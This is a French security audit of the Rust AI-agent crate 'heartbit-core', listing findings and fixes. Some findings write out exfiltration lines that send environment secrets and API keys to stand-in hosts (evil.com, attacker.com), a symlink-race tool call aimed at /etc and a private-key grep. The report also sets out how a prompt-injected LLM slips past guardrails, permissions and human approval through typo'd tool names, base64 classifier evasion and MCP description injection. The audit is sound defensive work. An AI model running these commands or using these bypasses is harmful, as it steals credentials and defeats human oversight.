# Audit de sécurité — `heartbit-core` (2026-05-06)

> **Périmètre** : crate `crates/heartbit-core` (~2.85 MB, 128 fichiers Rust). Audit
> effectué par 7 agents `general-purpose` parallèles, lecture intégrale des
> modules à risque (bash/patch/mcp/permission/runner/guardrails/etc.) + lecture
> ciblée des autres. `cargo audit` exécuté sur le workspace.
>
> **Convention de sévérité** : Critical = exécution arbitraire, fuite de
> credentials cross-tenant, bypass complet d'une défense ; High = fuite/escalade
> non-triviale, bypass partiel d'une défense, DoS sérieux ; Medium = info
> disclosure, DoS local, race exploitable conditionnellement ; Low = hardening
> manquant ; Info = note de design / dette.

---

## 1. Résumé exécutif

**78 findings (6 Critical, 21 High, 21 Medium, 18 Low, 12 Info) + 4 CVE de dépendances effectives**, répartis sur 7 surfaces.

| Surface | Critical | High | Medium | Low | Info |
|---|---|---|---|---|---|
| FS / exec (bash, write, patch, edit, read, glob, grep, skill) | 1 | 4 | 3 | 3 | 1 |
| Réseau / SSRF (webfetch, websearch, image_gen, twitter, tts) | 0 | 2 | 2 | 3 | 2 |
| MCP / A2A | 2 | 2 | 4 | 4 | 4 |
| Auth / permissions / multi-tenant | 0 | 1 | 3 | 1 | 1 |
| LLM providers (Anthropic/Gemini/OpenAI-compat/OpenRouter) | 1 | 4 | 2 | 2 | 1 |
| Memory / knowledge / template / LSP | 0 | 3 | 3 | 3 | 1 |
| Agent core + guardrails | 2 | 5 | 4 | 2 | 2 |
| **Total** | **6** | **21** | **21** | **18** | **12** |

**Top 6 (Critical) — à corriger en priorité absolue** :

1. **F-AGENT-1** — `runner.rs:1996` répare les noms de tool via Levenshtein ≤ 2 *après* le passage des guardrails et des permissions. Une typo (`bask` → `bash`) bypasse `ToolPolicyGuardrail`, `ActionBudgetGuardrail`, `SensorSecurityGuardrail`, permissions et HITL.
2. **F-AGENT-2** — Le path `delegate_task` de l'orchestrator ne propage **pas** ses `guardrails` aux sub-agents (`SpawnAgentTool` le fait). Defense-in-depth silencieusement absente.
3. **F-MCP-1** — `McpClient::connect_http` (mcp.rs:1728) accepte n'importe quelle URL. Le commentaire affirme une validation SSRF qui n'existe pas. Tous les call sites passent l'URL brute, plus l'auth header. → Exfil cloud-metadata (AWS/GCP), accès Redis/Postgres internes, vol de tokens RFC 8693.
4. **F-MCP-3** — `McpServer::handle_request` (mcp_server.rs:166) n'a aucun mécanisme d'auth. Si un intégrateur le mount sur Axum sans middleware (le code ne le force pas), tout client réseau exécute `tools/call bash`/`write`/`patch`. Sessions auto-créées sans bound = DoS mémoire.
5. **F-LLM-1** — `Client::new()` (anthropic.rs:39, gemini.rs:33, openai_compat.rs:41) n'a pas `redirect(Policy::none())`. reqwest 0.12 strippe sur redirect cross-host **uniquement** `Authorization`, `Cookie`, `cookie2`, `Proxy-Authorization`, `WWW-Authenticate` (vérifié primary source : `reqwest-0.12.28/src/redirect.rs:239-251`). `x-api-key`/`x-goog-api-key`/`api-key` (custom auth headers) **sont conservés**. Un upstream compromis (ou base_url misconfiguré) renvoie un 302 vers un attaquant qui récolte les clés API.
6. **F-FS-1** — `WriteTool` / `PatchTool` (write.rs:101-114, patch.rs:104-117) canonicalisent l'**ancêtre existant**, pas le path final, pour contourner le fait que `CorePathPolicy::check_path` plante sur fichier inexistant. TOCTOU symlink exploitable via parallel tool execution (JoinSet) : `[write({path: "/work/file"}), bash({command: "rm /work/file && ln -s /etc /work/file"})]` dans le même turn LLM. Sans la feature `sandbox` ou sur macOS, c'est l'écriture FS arbitraire.

**Chaînes d'attaque critiques composées** :

- **Exfil de clés API** : F-LLM-1 (redirect leak headers) + F-MCP-1 (SSRF McpClient permet à un MCP malveillant de servir un 302) → exfil one-shot des clés Anthropic/Gemini.
- **RCE via prompt injection** : F-AGENT-6 (injection classifier bypass via base64) + F-AGENT-1 (Levenshtein bypass) + F-FS-2 (env inherit par défaut) → un email piégé fait exécuter `bask -c 'env | base64 | curl evil.com -d @-'` qui leak toutes les clés env.
- **Cross-tenant data leak** : F-MEM-2 (shared_memory_read sans cap Confidentiality) + F-KB-1 (KnowledgeBase sans tenant) + F-AGENT-3 (cache key sans tenant_id) → trois voies indépendantes pour une fuite cross-tenant en mode daemon.

**4 CVE de dépendances effectivement applicables** (path-of-use vérifié via `cargo tree -p heartbit-core --invert`) :

| Advisory | Crate | Version | Risque |
|---|---|---|---|
| RUSTSEC-2026-0049 | rustls-webpki 0.103.9 | CRL/Distribution Point matching cassé → mauvaise révoc cert |
| RUSTSEC-2026-0098 | rustls-webpki 0.103.9 | Name constraints sur URI mal vérifiés |
| RUSTSEC-2026-0099 | rustls-webpki 0.103.9 | Wildcard certs acceptés sous name constraints |
| RUSTSEC-2026-0104 | rustls-webpki 0.103.9 | Reachable panic dans le parsing CRL |

→ `cargo update -p rustls-webpki` (bump ≥ 0.103.13 corrige les 4 d'un coup).

**CVE NON applicables à heartbit-core** : RUSTSEC-2023-0071 (rsa Marvin) et RUSTSEC-2026-0037 (quinn-proto DoS) ne sont pas dans l'arbre de dépendances de la crate (vérifié `cargo tree --invert` → vide). Ces CVE concernent d'autres crates du workspace (`heartbit-cli`/`heartbit-cloud`/`heartbit`) et doivent être réévaluées dans leur audit propre.

---

## 2. Modèle de menace adopté pour cet audit

**Untrusted inputs** :
- Outputs LLM (incluant `tool_use` blocks, `text`, paramètres JSON arbitraires)
- Bodies HTTP des outputs `webfetch` (HTML/markdown) et de tool MCP (`result`, `error.message`, descriptions, schemas)
- Réponses des serveurs MCP/A2A externes (full JSON-RPC payload, SSE events, headers)
- Réponses streamées des LLM providers (SSE chunks, JSON tool deltas)
- Fichiers chargés (HEARTBIT.md, SKILL.md, permissions.toml, knowledge files)
- Variables d'environnement (process inheritance dans bash)
- Configurations TOML utilisateur (peut contenir `base_url` mal positionné)

**Trusted** :
- Code de la crate elle-même
- Configuration émise par l'opérateur du système (TOML)
- Variables d'environnement *de l'opérateur* (clés API)

**Adversaires considérés** :
1. LLM hostile / jailbreaké (prompt injection en amont)
2. Serveur MCP malveillant ou compromis
3. Provider LLM compromis ou MITMé (DNS hijack, BGP, mauvaise config TLS)
4. Tenant adverse dans un déploiement multi-tenant (daemon mode)
5. Attaquant local ayant accès au filesystem (cas dégénéré ; pas le cœur)

**Hors périmètre** :
- Crates `heartbit` (umbrella), `heartbit-cli`, `heartbit-cloud` (référencés mais non audités)
- Crate `heartbit-sensors`, `heartbit-telegram`, `heartbit-macro`
- Audit cryptographique formel des primitives `subtle::ConstantTimeEq`, `hmac`, `sha1` (utilisation vérifiée, pas l'impl)

---

## 3. Findings détaillés

### 3.1 — Filesystem / Exec

> Le LLM contrôle `command`, `file_path`, `pattern`, `name` directement. Surface
> = 13 outils builtins (bash, write, patch, edit, read, glob, grep, list, skill,
> file_tracker, mais aussi todo, question, tts, image, twitter, websearch,
> webfetch).

#### F-FS-1 — **Critical (sans sandbox) / High (avec sandbox)** — TOCTOU symlink dans WriteTool/PatchTool
- **File** : `crates/heartbit-core/src/tool/builtins/write.rs:101-114` ; `patch.rs:104-117`
- **Code** :
  ```rust
  // write.rs — walk-up to first existing ancestor
  let mut probe = path.clone();
  while !probe.exists() {
      match probe.parent() {
          Some(p) if p != probe => probe = p.to_path_buf(),
          _ => break,
      }
  }
  if let Err(e) = policy.check_path(&probe) { ... }
  // ... puis tokio::fs::write(&path, content)  // <-- path NON canonicalisé
  ```
- **Attaque** : LLM hostile dans un seul turn :
  `[write({file_path: "/work/legit/file.txt"}), bash({command: "rm /work/legit && ln -s /etc /work/legit"})]`. Les deux outils s'exécutent en parallèle via `tokio::JoinSet` (ReAct loop) ; race window suffisante pour que le `write` perde la course → écriture dans `/etc/file.txt`.
- **Fix** : ouvrir avec `OpenOptions::new().create_new(true).custom_flags(libc::O_NOFOLLOW)`, et après écriture re-canonicaliser et vérifier `starts_with(allowed_dir)` ; si KO, `unlink` + erreur. Ajouter `CorePathPolicy::check_path_for_create()` qui canonicalise le parent puis recompose `parent.canonicalize().join(file_name)`.

#### F-FS-2 — High — `EnvPolicy::Inherit` par défaut → exfiltration de secrets
- **File** : `workspace.rs:103-109` (default) ; `tool/builtins/mod.rs:152` (BuiltinToolsConfig) ; `bash.rs:155-165`
- **Risque** : `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `AWS_*`, `GITHUB_TOKEN` sont hérités dans bash. Une injection de prompt déclenche `curl -d "$ANTHROPIC_API_KEY" attacker.com`.
- **Fix** : `EnvPolicy::default()` doit retourner `Allowlist(DAEMON_ENV_ALLOWLIST.iter().map(|s| s.to_string()).collect())`. Filtrer activement `*_KEY|*_TOKEN|*_SECRET|*_PASSWORD` même en mode `InheritAll` opt-in.

#### F-FS-3 — High — `workspace_only` accorde R+W sur `/tmp`
- **File** : `sandbox.rs:146-156`
- **Risque** : `/tmp` partagé avec d'autres processus → vector de TOCTOU (cf F-FS-1) et fuite cross-tenant (mode daemon multi-host).
- **Fix** : remplacer `/tmp` par `std::env::temp_dir().join(format!("heartbit-{uuid}"))` créé en `0700`.

#### F-FS-4 — High — `glob`/`grep`/`list` n'appliquent **pas** `path_policy`
- **File** : `tool/builtins/mod.rs:213-215` ; `glob.rs:25-32` ; `grep.rs:26-32` ; `list.rs:43-49`
- **Risque** : sans workspace configuré, `grep({pattern: "BEGIN PRIVATE KEY", path: "/home"})` énumère librement. `read.rs` applique la policy ; pas ces trois outils.
- **Fix** : ajouter `with_path_policy` aux trois outils + vérification post-filtrage des résultats. Filtrer les symlinks sortants même sans workspace.

#### F-FS-5 — High — Pas de protection kernel sur macOS / Linux sans feature `sandbox`
- **File** : `sandbox.rs:113-114` ; `bash.rs:128-180` ; `crates/heartbit-cli/Cargo.toml:47`
- **Risque** : `feature = "sandbox"` n'est pas dans `default-features`. Sur macOS, le bloc Landlock n'existe pas (`cfg(target_os = "linux")`). Reste seulement `policy.check_path(&cwd)` qui ne contraint que le cwd — `bash -c 'cd / && cat /etc/passwd'` passe.
- **Fix** : `default = ["sandbox"]` dans Cargo.toml ; sur macOS intégrer `sandbox-exec(1)` ou refuser bash si `path_policy` requise. `tracing::warn!` au build de BashTool quand kernel sandbox non disponible.

#### F-FS-6 — Medium — `CorePathPolicy::check_path` plante sur fichier inexistant
- **File** : `sandbox.rs:35-49`
- **Cause racine** de F-FS-1 ; ajouter `check_path_for_create` officiel.

#### F-FS-7 — Medium — `SkillTool` charge `SKILL.md` jusqu'à la racine FS
- **File** : `tool/builtins/skill.rs:119-152`
- **Risque** : un attaquant qui peut écrire dans `/home/user/.opencode/skills/build/SKILL.md` empoisonne le contexte LLM d'un projet voisin.
- **Fix** : limiter la remontée à la racine du workspace ; refuser tout SKILL.md au-dessus.

#### F-FS-8 — Medium — Hijacking du `cwd` tracké via `__HEARTBIT_CWD__` injecté en stdout
- **File** : `bash.rs:251-263`
- **Risque** : commande `echo __HEARTBIT_CWD__=/etc; exec sh -c true` détourne le cwd tracké (sans workspace). Pas de nonce dans le marqueur.
- **Fix** : générer un nonce UUID au spawn, marqueur `__HEARTBIT_CWD_<nonce>__=...`.

#### F-FS-9 — Medium — `resolve_path` sans workspace → chemins absolus arbitraires
- **File** : `tool/builtins/mod.rs:81-87`
- **Risque** : `resolve_path("/etc/shadow", None, &[]) == Ok(/etc/shadow)`. CLI sans config = lecture/écriture arbitraires sous l'identité du process.
- **Fix** : workspace par défaut = `current_dir()` canonicalisé ; populer `protected_paths` avec une liste raisonnable.

#### F-FS-10 — Low — Race fork/pre_exec, FDs non-CLOEXEC + alloc dans pre_exec en cas d'erreur
- **File** : `bash.rs:170-180` ; `sandbox.rs:240-264`
- **Risque** : `e.to_string()` dans le child post-fork peut dead-lock si le parent multi-thread tient un mutex de `malloc`. Les FDs ouverts pré-fork ne sont pas fermés par Landlock.
- **Fix** : `FD_CLOEXEC` sur tous les FDs sensibles avant spawn ; `io::Error::from_raw_os_error()` au lieu de `.to_string()` dans `into_pre_exec`.

#### F-FS-11 — Low — `is_protected` non normalisé / case-sensitive
- **File** : `tool/builtins/mod.rs:28-42, 81-87`
- **Risque** : `secret.ENV` (APFS/HFS+) ou `/home/user//.ssh/key` bypassent.
- **Fix** : `normalize_path` avant `is_protected` ; case-fold sur FS insensibles ; `glob::Pattern::matches_path` uniforme.

#### F-FS-12 — Info — `parse_unified_diff` accepte les chemins absolus
- **File** : `patch.rs:376-396` — refuse `..` mais pas les paths absolus.

---

### 3.2 — Réseau / SSRF

#### F-NET-1 — High — Vendor responses lues sans cap → DoS / OOM
- **File** : `tts.rs:195-198`, `image_generate.rs:140-143`, `websearch.rs:135-138`, `twitter_post.rs:228-231`
- **Risque** : `response.bytes()` / `response.text()` sans limite. Un vendor compromis (ou DDG via DNS hijack) sert 50 GB → OOM.
- **Fix** : `MAX_VENDOR_RESPONSE_BYTES` cap via `bytes_stream()`, abort à la borne.

#### F-NET-2 — High — DNS rebinding bypasse `SafeUrl` blocklist
- **File** : `http.rs:12-18` (limitation explicitement documentée), exploit `webfetch.rs:134-145`
- **Risque** : domaine TTL=0 sert IP publique au parse, IP privée au connect → AWS metadata accessible.
- **Fix** : `reqwest::dns::Resolve` custom qui re-vérifie au moment de retourner les `SocketAddr` à reqwest, branché via `ClientBuilder::dns_resolver`.

#### F-NET-3 — Medium — `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY` honorés par défaut
- **File** : `http.rs:217-219, 227-229`
- **Risque** : reqwest charge auto les proxies env quand `.no_proxy()` n'est pas appelé. MITM via env injection / opérateur multi-tenant qui exporte un proxy interne.
- **Fix** : `.no_proxy()` sur les deux builders ; opt-in explicite `HEARTBIT_HTTP_PROXY`.

#### F-NET-4 — Medium — Pas de `connect_timeout` (slow-loris)
- **File** : `webfetch.rs`, `websearch.rs`, `image_generate.rs`, `twitter_post.rs`, `tts.rs` — uniquement `timeout` total.
- **Fix** : `.connect_timeout(Duration::from_secs(5))` dans les builders communs.

#### F-NET-5 — Low — User-Agent fingerprinte le framework
- **File** : `webfetch.rs:67-68` (`heartbit/0.1`), `websearch.rs:254-257` (`Mozilla/5.0 (compatible; Heartbit/1.0)`)
- **Risque** : sites peuvent servir des prompts injection ciblées.
- **Fix** : User-Agent banalisé ou configurable par tenant.

#### F-NET-6 — Low — Pas de `https_only` / `min_tls_version` — HTTP cleartext autorisé
- **Fix** : `.https_only(true)` sur `vendor_client_builder` ; opt-in `allow_http` sur `SafeUrl::parse` pour webfetch.

#### F-NET-7 — Low — `webfetch` mode `format=html` retourne body brut → prompt injection
- **File** : `webfetch.rs:182-186`
- **Fix** : supprimer le format `html`, ou wrapper avec délimiteurs `<<<FETCHED>>>` + post-strip `<script>`/`<style>`/`<!--`.

#### F-NET-8 — Info — OAuth 1.0a base string n'inclut pas le body JSON (intégrité = TLS)
- **File** : `twitter_post.rs:120-125` — conforme RFC 5849 mais à documenter.

#### F-NET-9 — Info — nonce OAuth = UUID v4, OK par RFC 5849 §3.3.

---

### 3.3 — MCP / A2A

#### F-MCP-1 — **Critical** — SSRF dans `McpClient::connect_http` ; commentaire trompeur
- **File** : `tool/mcp.rs:1728-1748`
- **Risque** : URL utilisée brute, le commentaire affirme une validation SSRF qui n'existe nulle part. `auth_header` (potentiellement un token RFC 8693 délégué) part vers l'hôte attaquant. Tous les call sites côté CLI/daemon passent l'URL non validée.
- **Fix** : `crate::http::SafeUrl::parse(endpoint, IpPolicy::default()).await?` avant `HttpTransport::new`. Idem `TokenExchangeAuthProvider::new` (mcp.rs:650-676).

#### F-MCP-3 — **Critical (conditionnel)** — `McpServer::handle_request` sans auth
- **File** : `tool/mcp_server.rs:166-207, 151-163, 264-298`
- **Risque** : `ensure_session` auto-crée pour tout sid ; `tools/call` exécute sans check. Si l'opérateur mount sans middleware → exécution arbitraire.
- **Fix** : `auth_callback` requis ; doc-comment qui exige une middleware ; LRU+TTL sur `sessions`.

#### F-MCP-2 — High — `tool.name`/`description` MCP injectés bruts ; collision builtin
- **File** : `tool/mcp.rs:349-358`
- **Risque** : (1) prompt injection via `description` (newlines, jailbreak), (2) un serveur MCP peut s'enregistrer comme `bash`/`write` et shadow les builtins, (3) input_schema arbitraire désactive `validate_tool_input`.
- **Fix** : préfixe `format!("mcp_{server_alias}_{}", sanitize_tool_name(&t.name))` (cohérent avec resources/prompts) ; sanitize newlines/control chars dans description ; refuser collision avec builtins dans `AgentRunnerBuilder::tools()`.

#### F-MCP-12 — High — A2A `agent_card.url` non re-validé
- **File** : `tool/a2a.rs:432-468`
- **Risque** : `connect_internal` valide bien `base_url + /.well-known/agent.json` via `SafeUrl::parse` (ligne 439, bon), mais `agent_card.url` retourné est utilisé tel quel ensuite. SSRF stage 2 — pattern OpenID Connect discovery.
- **Fix** : re-`SafeUrl::parse` sur `agent_card.url`, vérifier que `host` matche le `base_url`.

#### F-MCP-4 — Medium — Body JSON-RPC non borné HTTP+stdio
- **File** : `tool/mcp.rs:1062` (HTTP), `387-396` (stdio)
- **Fix** : cap via `bytes_stream()` HTTP ; `take(MAX_LINE_BYTES).read_line()` stdio.

#### F-MCP-5 — Medium — `find_rpc_response` fallback silencieux au dernier event SSE
- **File** : `tool/mcp.rs:295-313`
- **Fix** : faire échouer durement si l'`id` ne match pas.

#### F-MCP-7 — Medium — Erreur JSON-RPC injectée brute dans le tool result
- **File** : `tool/mcp.rs:367-371, 1314-1322`
- **Fix** : préfixer `[mcp_server_error]`, tronquer à N caractères.

#### F-MCP-10 — Medium — Resource URI scheme non filtré côté client (`file://` accepté)
- **File** : `tool/mcp.rs:1370-1391, 1872-1877`
- **Fix** : whitelist de schemes via `McpClient::with_allowed_schemes(["mcp", "https"])`.

#### F-MCP-6 — Low — Log injection via `notifications/message` (newlines/ANSI dans data)
- **File** : `tool/mcp.rs:227-253`
- **Fix** : strip `\n`/`\r`/ANSI escapes ; cap longueur `data` (4 KiB).

#### F-MCP-8 — Low — Cache key `format!("{user_id}:{resource}:{scopes}")` — collision si user_id contient `:`
- **File** : `tool/mcp.rs:885-888`
- **Fix** : tuple typé comme clé (cohérence avec `auth_header_for` ligne 777).

#### F-MCP-13 — Low — A2A : `id` JSON-RPC non vérifié dans la réponse
- **File** : `tool/a2a.rs:228-266`

#### F-MCP-14 — Low — `unwrap_or_default()` envoie `Authorization:` vide (heartbit-cli, hors périmètre)

#### F-MCP-9 — Info — Capability `sampling` annoncée mais jamais servie ; piège pour futurs implémenteurs
- **Fix** : retirer la capability tant que non implémentée ; sinon prévoir budget+whitelist modèles dès le départ.

#### F-MCP-11 — Info — `connect_stdio` n'audite ni command/args/env (operator-trust à documenter explicitement).

#### F-MCP-15 — Info — `parse_handoff_sentinel` sans tenant scoping (à valider dans `HandoffRunner`).

#### F-MCP-16 — Info — `tracing::warn` log les bodies IdP en cas d'erreur (token leak partiel possible).

---

### 3.4 — Auth / permissions / multi-tenant

> **Bonnes nouvelles** (à conserver) : `auth::ct::ct_eq_str` correctement implémenté
> via `subtle::ConstantTimeEq` ; aucune comparaison `==` sur secret/token/api_key
> dans `heartbit-core` ; JWT umbrella hardcode `Algorithm::RS256` (pas de
> `alg=none`/HS256 confusion) ; `Session::id = Uuid::new_v4()` (CSPRNG via getrandom) ;
> `TenantTokenTracker::reserve` atomique via `RwLock` ; `TenantScope::new("")`
> collapse vers `single_tenant()` ; tenant identity injectée dans audit côté
> serveur (pas parsée du LLM output → pas spoofable par injection).

#### F-AUTH-1 — High — `PermissionRule::matches` ignore arrays/nested objects
- **File** : `crates/heartbit-core/src/agent/permission.rs:56-65`
- **Risque** : `[[rules]] tool="*" pattern="*.env*" deny` est bypass par tout outil dont l'input prend un array (`{"paths": [".env"]}`) ou un nested (`{"options": {"file": ".env"}}`). Builtins flat-string OK ; tools custom/MCP exposés.
- **Fix** : helper `collect_strings` récursif sur `Object`/`Array` puis match contre tous les strings.

#### F-AUTH-2 — Medium — `LearnedPermissions::save` écrit en umask par défaut (typiquement 0644)
- **File** : `permission.rs:181`
- **Risque** : fichier world-readable + tampering possible (NFS/Dropbox/sync container) → injection de rules `allow *` pour bypass HITL.
- **Fix** : `OpenOptions::new().mode(0o600)` ; check ownership/perms au load ; cap `rules.len()`.

#### F-AUTH-3 — Medium — `strip_content` (audit) non récursif → `result_preview`/`error` leak en `MetadataOnly`
- **File** : `agent/audit.rs:31-51` ; `agent/runner.rs:1062-1075, 434-446`
- **Risque** : `audit_mode = "metadata_only"` promet "no user content" mais `result_preview` (1000 char de l'output) et `error` (qui peut écho user input) ne sont pas dans la liste de strip. Risque RGPD/HIPAA.
- **Fix** : passer en allow-list (réplaçer toute valeur non-primitive par `[stripped]` sauf clés safe-listed) + récursivité.

#### F-AUTH-4 — Medium — Glob/tool name match codepoint-equal ; bypass via casing/Unicode
- **File** : `permission.rs:46-49, 235-267`
- **Risque** : sur macOS/Windows FS case-insensitive, `*.env` ne match pas `.ENV` ; `read_file` ≠ `Read_File`.
- **Fix** : `case_insensitive: bool` sur `PermissionRule` ; `eq_ignore_ascii_case` pour tool names ; NFC normalize via `unicode-normalization`.

#### F-AUTH-5 — Low — `InteractionBridge::take_pending` ne vérifie pas le `session_id`
- **File** : `channel/bridge.rs:301-309`
- **Risque** : si `interaction_id` (UUID v4 = unguessable, donc défense en profondeur) leak via logs, un autre client peut résoudre l'approbation avec `Allow`.
- **Fix** : matcher `(session_id, id)` dans `resolve_*`.

#### F-AUTH-6 — Info — `AuditMode::Full` en default (anti privacy-by-default).

---

### 3.5 — LLM providers

#### F-LLM-1 — **Critical** — Headers custom (`x-api-key`/`x-goog-api-key`/`api-key`) non strippés sur redirect cross-host
- **File** : `anthropic.rs:39, 53` ; `gemini.rs:33, 47` ; `openai_compat.rs:41`
- **Code** :
  ```rust
  // anthropic.rs:69-77
  .header("x-api-key", &self.api_key)            // header non standard
  ```
  reqwest 0.12 strippe uniquement `Authorization`, `Cookie`, `Cookie2`, `Proxy-Authorization`, `WWW-Authenticate` (cf reqwest-0.12.28/src/redirect.rs:244-248). `x-api-key` est conservé.
- **Risque** : upstream compromis (DNS hijack / `base_url` mal configuré) renvoie 302 → clé Anthropic/Gemini exfiltrée à l'attaquant en clair.
- **Fix** : `Client::builder().redirect(Policy::none()).https_only(true).build()` sur tous les providers. **Quick win** : corrige aussi F-LLM-2 et F-LLM-8 d'un coup.

#### F-LLM-2 — High — Aucun timeout sur reqwest → slow-loris
- **File** : tous les providers (`Client::new()`)
- **Fix** : `connect_timeout(10s)`, `timeout(120s)` pour `complete()`, `read_timeout` pour streaming (reqwest 0.12 supporte `.read_timeout()` qui s'applique entre chunks).

#### F-LLM-3 — High — `SseParser.buffer` et `data_lines` non bornés → OOM
- **File** : `anthropic.rs:297-394` (partagé via `pub(crate) use` par openrouter/gemini)
- **Code** : `self.buffer.push_str(chunk)` sans cap ; un upstream qui drip-feed `'A' * 1MiB` toutes les secondes OOM le process.
- **Fix** : `MAX_LINE_LEN = 1 << 20`, `MAX_EVENT_DATA = 8 << 20`, return Err si dépassé.

#### F-LLM-4 — High — Accumulateurs SSE de réponse non bornés (text, tool_calls, args)
- **File** : `anthropic.rs:550, 557` ; `openrouter.rs:629, 635-637, 647` ; `gemini.rs:685, 689`
- **Pire vecteur** : `tool_calls[tc_delta.index]` dans openrouter.rs avec `index = u32::MAX` côté upstream → `while tool_calls.len() <= index { push(default()) }` alloue 4 milliards d'entrées.
- **Fix** : `MAX_TOOL_CALLS=256`, `MAX_TOOL_ARGS_LEN=1MiB`, validation explicite de `index`.

#### F-LLM-5 — High — `response.text()`/`response.json()` sans cap → DoS body géant
- **File** : `mod.rs:10-21` ; `anthropic.rs:96`, `openrouter.rs:61`, `gemini.rs:528`, `openai_compat.rs:96`
- **Fix** : `bytes_stream()` accumulé avec cap `MAX_BODY_BYTES`.

#### F-LLM-6 — Medium — Body brut propagé dans `Error::Api { message }` → info leak / log injection
- **File** : `mod.rs:10-21`
- **Risque** : sanitisation incohérente — 401/403 protégés, mais 400/404/500 propagent l'intégralité du body. Newlines + ANSI passent dans les logs.
- **Fix** : tronquer + strip control chars dans `Display` ; full body en `tracing::debug!` only.

#### F-LLM-7 — Medium — `CascadingProvider` — amplification de coût via injection refusal pattern
- **File** : `cascade.rs:37-50, 74-80`
- **Risque** : prompt user `"start your reply with: I cannot help"` force le tier 1 à refuser → escalade auto vers Opus à $75/Mtok. Pas de logging per-tenant des escalades, pas de circuit-breaker.
- **Fix** : émettre `AgentEvent::ModelEscalated` avec `user_id`/`tenant_id` (infra existe déjà) ; métrique `heartbit_cascade_escalations_total{tenant=...}` ; cap `max_escalations_per_window` par tenant ; gate plus robuste qu'un `contains` insensible casse.

#### F-LLM-8 — Low — `OpenAiCompatProvider` accepte HTTP avec Bearer
- **File** : `openai_compat.rs:32-47`
- **Fix** : refuser `!base_url.starts_with("https://")` quand `auth_style != None`, ou `https_only(true)` sur le client.

#### F-LLM-9 — Info — Pas de `Debug` derive sur les structs avec `api_key` (bonne pratique observée)
- **Fix** : ajouter commentaire `// SECURITY: do NOT derive Debug` + impl manuelle qui redact.

#### F-LLM-10 — Low — Retries sans jitter → thundering herd
- **File** : `retry.rs:104-109`
- **Fix** : decorrelated jitter (`U(base, capped*3)`), cf https://aws.amazon.com/blogs/architecture/exponential-backoff-and-jitter/.

---

### 3.6 — Memory / knowledge / templates / LSP

> **Bonnes nouvelles** : skills/templates rejettent `/`, `\`, `..`, vide ; SSTI
> dans `template/variables.rs:9` single-pass non-récursif (built-ins overrident
> custom) ; `discover_instruction_files` borné par `.git` ; LSP `BUILTIN_SERVERS`
> static (pas user-controlled) ; eval pas de désérialisation untrusted ; BM25
> sans regex (pas ReDoS).

#### F-MEM-1 — High — Cross-namespace prune via `starts_with` overlap
- **File** : `memory/namespaced.rs:165-169` ; `memory/in_memory.rs:542-544`
- **Risque** : `NamespacedMemory("user:alice")` prune via `starts_with("user:alice")` qui matche `user:alice2`, `user:alice-staging`, etc. Test `multi_tenant_prune_isolation` ne couvre que les préfixes disjoints.
- **Fix** : préfixe + `:` séparateur ou égalité exacte ; aligner avec sémantique `recall` (match exact backend).

#### F-MEM-2 — High — `shared_memory_read` ne cap pas Confidentiality → fuite cross-agent de `Restricted`
- **File** : `memory/shared_tools.rs:109-122`
- **Risque** : `Confidentiality::Restricted` documenté "never in LLM context" mais le tool court-circuite la namespace cap. Combiné à F-MEM-6 (LLM peut élever lui-même à Restricted), un agent peut "blanchir" un secret puis le récupérer ailleurs.
- **Fix** : `max_confidentiality: Some(Confidentiality::Internal)` par défaut dans le tool ; refuser les niveaux ≥ Confidential en write LLM-driven.

#### F-KB-1 — High — Trait `KnowledgeBase` sans `TenantScope` → leak cross-tenant
- **File** : `knowledge/mod.rs:61-73` ; `knowledge/tools.rs:82-89`
- **Risque** : aucun param tenant dans `index`/`search`/`chunk_count`. Si une instance `Arc<dyn KnowledgeBase>` est partagée entre tenants, full leak. `Memory` a appris la leçon (scope obligatoire) ; `KnowledgeBase` ne suit pas.
- **Fix** : ajouter `&TenantScope` aux méthodes du trait + `tenant_id` dans `Chunk` + filter dans `InMemoryKnowledgeBase::search`.

#### F-MEM-3 — Medium — DoS unbounded growth in_memory store
- **File** : `memory/in_memory.rs:67-275`
- **Risque** : pas de cap `entries`, `recall` itère le HashMap entier puis BM25+cosine+RRF sur le résultat filtré. Spam `memory_store` → DoS CPU/RAM.
- **Fix** : `with_max_entries`, index inverse `agent → ids`, auto-prune au seuil.

#### F-KB-2 — Medium — `load_url` sans timeout/cap/host validation (SSRF latente)
- **File** : `knowledge/loader.rs:63-97`
- **Note** : aujourd'hui appelé depuis CLI admin uniquement → trust admin. Si un jour exposé en tool, SSRF complet.
- **Fix** : `Client::builder().timeout(30s).build()` ; refuser non-`http(s)` ; `SafeUrl::parse` ; cap body.

#### F-KB-3 — Medium — `load_file` sans cap → memory exhaustion
- **File** : `knowledge/loader.rs:11-36`
- **Fix** : `BufReader::new(File::open).take(MAX_BYTES)` + config `max_file_bytes` (défaut 10 MB).

#### F-LSP-1 — Low — LSP `Content-Length` parsing alloue `Vec<u8; n>` non borné
- **File** : `lsp/client.rs:189-210`
- **Risque** : trust = LSP server local choisi par l'utilisateur. Hardening si demain on permet des LSP custom via config.
- **Fix** : cap 64 MB.

#### F-MEM-4 — Low — `OpenAiEmbedding` sans timeout, `with_base_url` sans validation
- **File** : `memory/embedding.rs:65-141`
- **Risque** : un endpoint pirate (configuré via misconfig) reçoit le contenu de chaque mémoire + l'API key Bearer.
- **Fix** : `timeout(60s)` ; allowlist hosts ou au moins `https://`.

#### F-MEM-5 — Low — Tenant filter compare `None` à `""` — entries legacy lisibles en single-tenant
- **File** : `memory/in_memory.rs:87-89`
- **Fix** : traiter `None` comme mismatch dur ; backfill au load.

#### F-MEM-6 — Info/Low — `MemoryStoreTool` accepte `confidentiality: "restricted"` depuis l'input LLM
- **File** : `memory/tools.rs:84, 164`
- **Fix** : cap côté tool — `level.min(Confidentiality::Internal)` en write LLM-driven.

---

### 3.7 — Agent core + guardrails

#### F-AGENT-1 — **Critical** — Tool name repair (Levenshtein) bypasse permissions/guardrails
- **File** : `agent/runner.rs:1996-2007` (repair) ; `1186` (eval_permission) ; `1372-1375` (pre_tool)
- **Code** :
  ```rust
  // runner.rs:1996-2007 — repair APRÈS les checks
  let tool = self.tools.get(&call.name).cloned().or_else(|| {
      self.find_closest_tool(&call.name, 2)
          .and_then(|repaired_name| {
              tracing::warn!(...);
              self.tools.get(repaired_name).cloned()
          })
  });
  ```
- **Risque** : LLM hostile émet `bask` (typo Levenshtein 1). Toutes les rules deny `bash` font passer (nom différent). Au dispatch, la repair résout vers `bash` → exécution. **Aucun guardrail n'est rejoué** avec le nom réparé.
